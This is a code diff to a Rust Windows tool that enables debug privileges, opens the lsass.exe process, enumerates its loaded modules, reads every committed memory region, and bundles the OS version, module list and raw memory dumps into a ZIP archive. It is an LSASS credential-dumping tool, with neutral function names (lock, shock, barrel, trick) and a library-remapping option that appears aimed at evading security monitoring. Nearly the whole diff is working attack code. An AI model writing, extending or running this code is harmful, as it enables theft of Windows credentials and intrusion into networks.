@@ -5,24 +5,24 @@ use std::{
     iter::once,
     mem::{size_of, zeroed},
     os::windows::ffi::OsStrExt,
-    ptr::null_mut,
+    ptr::{self, null_mut},
 };
 use clap::Parser;
 use zip::{write::FileOptions, ZipWriter};
 use winapi::{
     shared::{
         basetsd::SIZE_T,
-        minwindef::{DWORD, FALSE, ULONG},
+        minwindef::{DWORD, FALSE, MAX_PATH, ULONG},
         ntdef::{HANDLE, LUID, NTSTATUS, PVOID, PWSTR, USHORT},
     },
     um::{
-        handleapi::CloseHandle,
         processthreadsapi::{
             CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW,
         },
         winbase::DEBUG_PROCESS,
         winnt::{
-            MEMORY_BASIC_INFORMATION, PAGE_NOACCESS, MEM_COMMIT, MAXIMUM_ALLOWED,
+            MEMORY_BASIC_INFORMATION, OSVERSIONINFOW, RTL_OSVERSIONINFOW,
+            PAGE_NOACCESS, MEM_COMMIT, MAXIMUM_ALLOWED,
             TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY,
         },
     },
@@ -31,15 +31,18 @@ use winapi::{
 
 type BOOLEAN = u8;
 const PROCESS_BASIC_INFORMATION_CLASS: ULONG = 0;
+const PROCESS_BASIC_INFORMATION: ULONG = 0;
 const STATUS_ACCESS_VIOLATION: i32 = 0xC0000005u32 as i32;
 const STATUS_INVALID_PARAMETER: i32 = 0x8000000Du32 as i32;
 const NT_SUCCESS: fn(NTSTATUS) -> bool = |status| status >= 0;
+const MAX_MODULES: usize = 1024;
 const STATUS_SUCCESS: NTSTATUS = 0;
 const PROCESS_DEBUG_OBJECT_HANDLE: ULONG = 0x1e;
 const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
 
 
 extern "system" {
+    fn RtlGetVersion(lpVersionInformation: *mut RTL_OSVERSIONINFOW) -> NTSTATUS;
     fn NtOpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle: *mut HANDLE) -> NTSTATUS;
     fn NtAdjustPrivilegesToken(TokenHandle: HANDLE, DisableAllPrivileges: BOOLEAN, NewState: *mut TOKEN_PRIVILEGES, BufferLength: DWORD, PreviousState: *mut TOKEN_PRIVILEGES, ReturnLength: *mut DWORD) -> NTSTATUS;
     fn NtReadVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, BufferSize: usize, NumberOfBytesRead: *mut usize) -> NTSTATUS;
@@ -49,18 +52,20 @@ extern "system" {
     fn NtRemoveProcessDebug(ProcessHandle: HANDLE, DebugObjectHandle: HANDLE) -> NTSTATUS;
     fn NtTerminateProcess(ProcessHandle: HANDLE, ExitStatus: NTSTATUS) -> NTSTATUS;
     fn NtClose(Handle: HANDLE) -> NTSTATUS;
-    fn NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: *mut *mut c_void, RegionSize: *mut SIZE_T, NewProtect: u32, OldProtect: *mut ULONG,) -> NTSTATUS;
-    fn NtWriteVirtualMemory( ProcessHandle: HANDLE, BaseAddress: *mut c_void, Buffer: *const c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: *mut usize,) -> NTSTATUS;
+    fn NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: *mut *mut c_void, RegionSize: *mut SIZE_T, NewProtect: u32, OldProtect: *mut ULONG) -> NTSTATUS;
+    fn NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: *mut c_void, Buffer: *const c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: *mut usize) -> NTSTATUS;
 }
 
 
+#[repr(u32)] #[derive(Debug, Clone, Copy)] pub enum MemoryInformationClass { MemoryBasicInformation = 0 }
 #[repr(C)] struct TOKEN_PRIVILEGES { privilege_count: DWORD, privileges: [LUID_AND_ATTRIBUTES; 1] }
 #[repr(C)] struct LUID_AND_ATTRIBUTES { luid: LUID, attributes: DWORD }
 #[allow(dead_code)] #[repr(C)] struct UNICODE_STRING { length: USHORT, maximum_length: USHORT, buffer: PWSTR }
 #[repr(C)] struct TOKEN_PRIVILEGES_STRUCT { privilege_count: DWORD, luid: LUID, attributes: DWORD }
-#[repr(u32)] #[derive(Debug, Clone, Copy)] pub enum MemoryInformationClass { MemoryBasicInformation = 0 }
+#[repr(C)] #[derive(Debug, Clone)] pub struct ModuleInformation { base_dll_name: [u8; MAX_PATH], full_dll_path: [u8; MAX_PATH], dll_base: PVOID, size: i32 }
+impl Default for ModuleInformation { fn default() -> Self { Self { base_dll_name: [0; MAX_PATH], full_dll_path: [0; MAX_PATH], dll_base: ptr::null_mut(), size: 0 } } }
+#[derive(Debug)] pub struct TextSectionInfo { pub base_of_code: DWORD, pub size_of_code: DWORD }
 #[allow(dead_code)] #[derive(Debug, Clone)] struct MemFile { filename: String, content: Vec<u8>, size: usize }
-#[derive(Debug)] pub struct TextSectionInfo { pub base_of_code: DWORD, pub size_of_code: DWORD,}
 
 
 fn nt_success(status: NTSTATUS) -> bool {
@@ -102,14 +107,14 @@ fn enable_debug_privileges() -> Result<(), String> {
         );
 
         if !NT_SUCCESS(status) {
-            CloseHandle(token_handle as *mut winapi::ctypes::c_void); // CloseHandle(token_handle);
+            NtClose(token_handle as *mut winapi::ctypes::c_void); // CloseHandle(token_handle);
             return Err(format!(
                 "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x{:08X}",
                 status
             ));
         }
 
-        CloseHandle(token_handle as *mut winapi::ctypes::c_void); // CloseHandle(token_handle);
+        NtClose(token_handle as *mut winapi::ctypes::c_void); // CloseHandle(token_handle);
         println!("[+] Debug privileges enabled successfully.");
         Ok(())
     }
@@ -175,6 +180,7 @@ unsafe fn get_proc_name_from_handle(process: HANDLE) -> Option<String> {
     let peb_offset = 0x8;
     let processparameters_offset = 0x20;
     let commandline_offset = 0x68;
+
     let mut pbi_buffer = [0u8; 48];
     let mut return_length: ULONG = 0;
 
@@ -185,6 +191,7 @@ unsafe fn get_proc_name_from_handle(process: HANDLE) -> Option<String> {
         pbi_buffer.len() as ULONG,
         &mut return_length,
     );
+
     if !nt_success(status) {
         eprintln!(
             "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x{:08X}",
@@ -217,41 +224,172 @@ unsafe fn get_process_by_name(target_name: &str) -> Option<HANDLE> {
 }
 
 
-fn create_memory_zip(memfile_list: Vec<MemFile>, zip_path: &str) -> std::io::Result<()> {
-    // Create the ZIP file
-    let file = File::create(zip_path)?;
-    let mut zip = ZipWriter::new(file);
-
-    // Add each memory region to the ZIP
-    for memfile in memfile_list {
-        let options = FileOptions::default()
-            .compression_method(zip::CompressionMethod::Stored);
-        
-        zip.start_file(memfile.filename, options)?;
-        zip.write_all(&memfile.content)?;
-    }
-
-    // Finalize the ZIP file
-    zip.finish()?;
-    Ok(())
+fn add_module(list: &mut Vec<ModuleInformation>, new_module: ModuleInformation) {
+    list.push(new_module);
 }
 
 
-unsafe fn barrel(json_file: &str, zip_file: &str) -> Result<(), String> {
-    enable_debug_privileges()?;    
-    let h_process = match get_process_by_name("c:\\windows\\system32\\lsass.exe") {
-        Some(h) => h,
-        None => {
-            eprintln!("[-] Process not found.");
-            return Err("Process not found".to_string());
-        }
+unsafe fn custom_get_module_handle(h_process: HANDLE) -> Result<Vec<ModuleInformation>, String> {
+    let mut module_list = Vec::with_capacity(MAX_MODULES);
+    const PEB_OFFSET: usize = 0x8;
+    const LDR_OFFSET: usize = 0x18;
+    const IN_INITIALIZATION_ORDER_MODULE_LIST_OFFSET: usize = 0x30;
+    const FLINK_DLLBASE_OFFSET: usize = 0x10;
+    const FLINK_BUFFER_FULLDLLNAME_OFFSET: usize = 0x30;
+    const FLINK_BUFFER_OFFSET: usize = 0x40;
+
+    let mut pbi_byte_array = [0u8; 48];
+    let pbi_addr = pbi_byte_array.as_mut_ptr() as PVOID;
+
+    let mut return_length = 0;
+    let ntstatus = NtQueryInformationProcess(
+        h_process,
+        PROCESS_BASIC_INFORMATION,
+        pbi_addr,
+        48,
+        &mut return_length,
+    );
+
+    if ntstatus != 0 {
+        return Err(format!("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x{:08X}", ntstatus));
+    }
+
+    let peb_pointer = (pbi_addr as usize + PEB_OFFSET) as PVOID;
+    let peb_address = *(peb_pointer as *const PVOID);
+
+    println!("[+] PEB Address: \t0x{:X}", peb_address as usize);
+
+    let ldr_pointer = (peb_address as usize + LDR_OFFSET) as PVOID;
+    let ldr_address = match read_remote_int_ptr(h_process, ldr_pointer) {
+        Some(addr) => addr,
+        None => return Err("Failed to read LDR address".to_string()),
     };
 
+    let in_initialization_order_module_list = (ldr_address as usize + IN_INITIALIZATION_ORDER_MODULE_LIST_OFFSET) as PVOID;
+    println!("[+] Ldr Pointer: \t0x{:X}", ldr_pointer as usize);
+    println!("[+] Ldr Address: \t0x{:X}", ldr_address as usize);
+
+    let mut dll_base: PVOID = 1337 as PVOID;
+    let mut next_flink = match read_remote_int_ptr(h_process, in_initialization_order_module_list) {
+        Some(flink) => flink,
+        None => return Err("Failed to read module list".to_string()),
+    };
+
+    while !dll_base.is_null() {
+        // Corrección clave: Ajustar el puntero SIN leer memoria
+        let current_entry = next_flink as usize - 0x10;
+        
+        // Leer campos desde la entrada actual
+        dll_base = match read_remote_int_ptr(
+            h_process, 
+            ((next_flink as usize) + FLINK_DLLBASE_OFFSET) as PVOID
+        ) {
+            Some(base) => base,
+            None => break,
+        };
+
+        let buffer = match read_remote_int_ptr(
+            h_process, 
+            (next_flink as usize + FLINK_BUFFER_OFFSET) as PVOID
+        ) {
+            Some(buf) => buf,
+            None => break,
+        };
+
+        let base_dll_name = read_remote_wstr(h_process, buffer);
+
+        // Create new ModuleInformation
+        let mut new_module = ModuleInformation::default();
+        new_module.dll_base = dll_base;
+        
+        // Copy base DLL name
+        let base_name_bytes = base_dll_name.as_bytes();
+        let copy_len = base_name_bytes.len().min(MAX_PATH - 1);
+        new_module.base_dll_name[..copy_len].copy_from_slice(&base_name_bytes[..copy_len]);
+        
+        // Full DLL Path
+        let full_dll_name_addr = match read_remote_int_ptr(
+            h_process, 
+            (next_flink as usize + FLINK_BUFFER_FULLDLLNAME_OFFSET) as PVOID
+        ) {
+            Some(addr) => addr,
+            None => break,
+        };
+        
+        let full_dll_name = read_remote_wstr(h_process, full_dll_name_addr);
+        
+        // Copy full DLL path
+        let full_path_bytes = full_dll_name.as_bytes();
+        let copy_len = full_path_bytes.len().min(MAX_PATH - 1);
+        new_module.full_dll_path[..copy_len].copy_from_slice(&full_path_bytes[..copy_len]);
+
+        if !dll_base.is_null() {
+            add_module(&mut module_list, new_module);
+        }
+
+        next_flink = match read_remote_int_ptr(
+            h_process, 
+            (current_entry + 0x10) as PVOID
+        ) {
+            Some(flink) => flink,
+            None => break,
+        };
+        // println!("[+] Processing module {}", counter);
+    }
+
+    Ok(module_list)
+}
+
+
+pub fn find_module_by_name(
+    module_list: &[ModuleInformation],
+    aux_name: &[u8],
+) -> ModuleInformation {
+    module_list
+        .iter()
+        .find(|module| module.base_dll_name == aux_name)
+        .cloned()
+        .unwrap_or_default()
+}
+
+
+pub fn find_module_index_by_name(
+    module_list: &[ModuleInformation],
+    aux_name: &[u8],
+) -> usize {
+    module_list.iter().position(|module| module.base_dll_name == aux_name).unwrap_or_default()
+}
+
+
+
+fn lock() -> String {
+    let mut osvi = OSVERSIONINFOW {
+        dwOSVersionInfoSize: std::mem::size_of::<OSVERSIONINFOW>() as DWORD,
+        dwMajorVersion: 0,
+        dwMinorVersion: 0,
+        dwBuildNumber: 0,
+        dwPlatformId: 0,
+        szCSDVersion: [0; 128],
+    };
+
+    unsafe {
+        assert_eq!(RtlGetVersion(&mut osvi), 0, "RtlGetVersion failed");
+        format!(
+            "[{{\"field0\":\"{}\",\"field1\":\"{}\",\"field2\":\"{}\"}}]",
+            osvi.dwMajorVersion, 
+            osvi.dwMinorVersion, 
+            osvi.dwBuildNumber
+        )
+    }
+}
+
+
+unsafe fn shock(h_process: HANDLE) -> String {    
+    let mut module_list = unsafe { custom_get_module_handle(h_process) };
     let proc_max_address_l: u64 = 0x7FFFFFFEFFFF;
-    let mut mem_address: PVOID = std::ptr::null_mut();    
-    let mut json_output = String::new();
-    let mut memfile_list: Vec<MemFile> = Vec::with_capacity(1000);
-    let mut memfile_count = 0;
+    let mut mem_address: PVOID = std::ptr::null_mut();
+    let mut aux_size: i32 = 0;
+    let mut aux_name: [u8; MAX_PATH] = [0; MAX_PATH];
 
     // Loop through the memory regions
     while (mem_address as u64) < proc_max_address_l {
@@ -276,12 +414,140 @@ unsafe fn barrel(json_file: &str, zip_file: &str) -> Result<(), String> {
 
         // If readable and committed --> Get information
         if mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT {
-            // Create buffer for memory content
+            let modules = match module_list.as_mut() {
+                Ok(modules) => modules,
+                Err(e) => {
+                    eprintln!("Failed to get module list: {}", e);
+                    return Default::default();
+                }
+            };
+            // let module_counter = modules.len();
+            
+            let module_found = find_module_by_name(modules, &aux_name);
+            // println!("[+] 0x{:X}\tmbi.Protect: 0x{:x}\tmbi.State: 0x{:x}\tmbi.RegionSize: 0x{:x}", mem_address as usize, mbi.Protect, mbi.State, mbi.RegionSize);
+            
+            if mbi.RegionSize == 0x1000 {
+                // println!("{}", aux_size);
+                // println!("{}", String::from_utf8_lossy(&aux_name[..aux_name.iter().position(|&x| x == 0).unwrap_or(aux_name.len())]));
+                // println!("[+] 0x{:X}\tmbi.Protect: 0x{:x}\tmbi.State: 0x{:x}\tmbi.RegionSize: 0x{:x}", mem_address as usize, mbi.Protect, mbi.State, mbi.RegionSize);
+
+                if mbi.BaseAddress != module_found.dll_base as *mut _ {
+                    let aux_index = find_module_index_by_name(modules, &aux_name);
+                    let mut updated_module = module_found.clone();
+                    updated_module.size = aux_size;
+                    modules[aux_index] = updated_module;
+                }
+
+                // Buscar si la dirección actual corresponde a algún módulo
+                for k in 0..(modules.len()) {
+                    if let Some(module) = modules.get(k) {
+                        if mbi.BaseAddress == module.dll_base as *mut _ {
+                            // Actualizar aux_name y aux_size
+                            aux_name.copy_from_slice(&module.base_dll_name);
+                            aux_size = mbi.RegionSize as i32;
+                            break;
+                        }
+                    }
+                }
+            } else {
+                // Incrementar tamaño si no es una nueva región
+                aux_size += mbi.RegionSize as i32;
+            }
+
+        }
+        
+        // Move to next memory region
+        mem_address = unsafe {
+            (mbi.BaseAddress as *mut u8).add(mbi.RegionSize) as PVOID
+        };
+    }
+
+    // Generar el JSON
+    let mut json_output = String::new();
+    
+    if let Ok(modules) = module_list {
+        for module in modules {
+            let name = module.base_dll_name.iter()
+                .take_while(|&&c| c != 0)
+                .map(|&c| c as char)
+                .collect::<String>();
+            let full_dll = module.full_dll_path.iter()
+                .take_while(|&&c| c != 0)
+                .map(|&c| c as char)
+                .collect::<String>();
+
+            json_output.push_str(&format!(
+                r#"{{"field0":"{}","field1":"{}","field2":"{:X}","field3":{}}},"#,
+                name.replace('\\', "\\\\").replace('"', "\\\""),
+                full_dll.replace('\\', "\\\\").replace('"', "\\\""),
+                module.dll_base as usize,
+                module.size
+            ));
+        }
+    }
+
+    // Formatear el resultado final
+    if !json_output.is_empty() {
+        format!("[{}]", json_output.trim_end_matches(','))
+    } else {
+        "[]".to_string()
+    }
+}
+
+/*
+fn create_memory_zip(memfile_list: Vec<MemFile>, zip_path: &str) -> std::io::Result<()> {
+    // Create the ZIP file
+    let file = File::create(zip_path)?;
+    let mut zip = ZipWriter::new(file);
+
+    // Add each memory region to the ZIP
+    for memfile in memfile_list {
+        let options = FileOptions::default()
+            .compression_method(zip::CompressionMethod::Stored);
+        
+        zip.start_file(memfile.filename, options)?;
+        zip.write_all(&memfile.content)?;
+    }
+
+    // Finalize the ZIP file
+    zip.finish()?;
+    Ok(())
+}
+*/
+
+unsafe fn barrel(h_process: HANDLE) -> Result<(String, Vec<MemFile>), String> {
+    let proc_max_address_l: u64 = 0x7FFFFFFEFFFF;
+    let mut mem_address: PVOID = std::ptr::null_mut();    
+    let mut json_output = String::new();
+    let mut memfile_list: Vec<MemFile> = Vec::with_capacity(1000);
+    let mut memfile_count = 0;
+
+    // Loop through the memory regions
+    while (mem_address as u64) < proc_max_address_l {
+        let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
+        let mut return_size: usize = 0;
+
+        let ntstatus = unsafe {
+            NtQueryVirtualMemory(
+                h_process,
+                mem_address,
+                MemoryInformationClass::MemoryBasicInformation,
+                &mut mbi as *mut _ as PVOID,
+                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
+                &mut return_size,
+            )
+        };
+        
+        if ntstatus != 0 {
+            println!("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x{:x}", ntstatus);
+        }
+
+        // If readable and committed --> Get information
+        if mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT {
             let region_size = mbi.RegionSize;
             let mut buffer: Vec<u8> = vec![0; region_size];
             let mut bytes_read: usize = 0;
 
-            // Read memory
             let status = unsafe {
                 NtReadVirtualMemory(
                     h_process,
@@ -292,12 +558,9 @@ unsafe fn barrel(json_file: &str, zip_file: &str) -> Result<(), String> {
                 )
             };
 
-            // println!("{}", status);
-            if status != 0 && status != 0x8000000Du32 as i32 { // 0x8000000D = Partial copy
+            if status != 0 && status != 0x8000000Du32 as i32 {
                 println!("NtReadVirtualMemory failed with status: 0x{:X}", status);
             }
-
-            // let fname = format!("{:x}", mbi.BaseAddress as usize);
 
             let json_item = format!(
                 "{{\"field0\":\"{:p}\", \"field1\":\"{:p}\", \"field2\":{}}}, ",
@@ -318,8 +581,7 @@ unsafe fn barrel(json_file: &str, zip_file: &str) -> Result<(), String> {
                 memfile_list.push(mem_file);
                 memfile_count += 1;
             } else {
-                println!("[-] Memfile list capacity exceeded");
-                break;
+                return Err("Memfile list capacity exceeded".to_string());
             }
         }
         
@@ -332,19 +594,7 @@ unsafe fn barrel(json_file: &str, zip_file: &str) -> Result<(), String> {
     println!("[+] Number of regions:\t{}", memfile_count);
 
     let json_output_final = format!("[{}]", json_output.trim_end_matches(", "));
-    match File::create(json_file)
-        .and_then(|mut file| file.write_all(json_output_final.as_bytes()))
-    {
-        Ok(_) => println!("[+] File {} generated correctly", json_file),
-        Err(e) => eprintln!("[-] Error writing to barrel.json: {}", e),
-    }
-
-    match create_memory_zip(memfile_list, zip_file) {
-        Ok(_) => println!("[+] File {}  generated correctly", zip_file),
-        Err(e) => eprintln!("[-] Error creating ZIP file: {}", e),
-    }
-
-    Ok(())
+    Ok((json_output_final, memfile_list))
 }
 
 
@@ -703,17 +953,94 @@ pub unsafe fn remap_library(){
 }
 
 
+fn generate_zip(
+    zip_filename: &str,
+    lock_json: &str,
+    shock_json: &str,
+    barrel_json: &str,
+    memfiles: &[MemFile],
+) -> Result<(), Box<dyn std::error::Error>> {
+    // Create the ZIP file
+    let file = File::create(zip_filename)?;
+    let mut zip = ZipWriter::new(file);
+
+    // Add JSON files
+    let options = FileOptions::default()
+        .compression_method(zip::CompressionMethod::Stored);
+
+    // Add main JSON files
+    zip.start_file("lock.json", options)?;
+    zip.write_all(lock_json.as_bytes())?;
+
+    zip.start_file("shock.json", options)?;
+    zip.write_all(shock_json.as_bytes())?;
+
+    zip.start_file("barrel.json", options)?;
+    zip.write_all(barrel_json.as_bytes())?;
+
+    // Create memory ZIP
+    let memory_zip = create_memory_zip(memfiles)?;
+    zip.start_file("barrel.zip", options)?;
+    zip.write_all(&memory_zip)?;
+
+    // Finalize the ZIP
+    zip.finish()?;
+
+    println!("[+] File {} generated correctly", zip_filename);
+    Ok(())
+}
+
+
+fn create_memory_zip(memfiles: &[MemFile]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    let mut buffer = Vec::new();
+    {
+        let mut zip = ZipWriter::new(std::io::Cursor::new(&mut buffer));
+        let options = FileOptions::default()
+            .compression_method(zip::CompressionMethod::Stored);
+
+        for memfile in memfiles {
+            if !memfile.content.is_empty() {
+                zip.start_file(&memfile.filename, options)?;
+                zip.write_all(&memfile.content)?;
+            }
+        }
+        zip.finish()?;
+    }
+    Ok(buffer)
+}
+
+
 #[derive(Parser)]
 #[command(author, version, about, long_about = None)]
 struct Args {
     #[arg(short = 'r', long)]
     remap: bool,
 
-    #[arg(short = 'j', long, default_value = "barrel.json")]
-    json_file: String,
-
-    #[arg(short = 'z', long, default_value = "barrel.zip")]
+    #[arg(short = 'z', long, default_value = "trick.zip")]
     zip_file: String,
+}
+
+
+unsafe fn trick(zip_file: &str) {
+    let _ = enable_debug_privileges();    
+    let h_process = match get_process_by_name("c:\\windows\\system32\\lsass.exe") {
+        Some(h) => h,
+        None => {
+            return;
+        }
+    };
+
+    let lock_json = lock();
+    let shock_json =shock(h_process);
+    let (barrel_json, memfile_list) = unsafe { barrel(h_process) }.unwrap();
+
+    let _ = generate_zip(
+        zip_file,
+        &lock_json,
+        &shock_json,
+        &barrel_json,
+        &memfile_list,
+    );
 }
 
 
@@ -723,8 +1050,6 @@ fn main() {
         if args.remap {
             remap_library();
         }
-        if let Err(e) = barrel(&args.json_file, &args.zip_file) {
-            eprintln!("Error: {}", e);
-        }
+        trick(&args.zip_file);
     }
 }
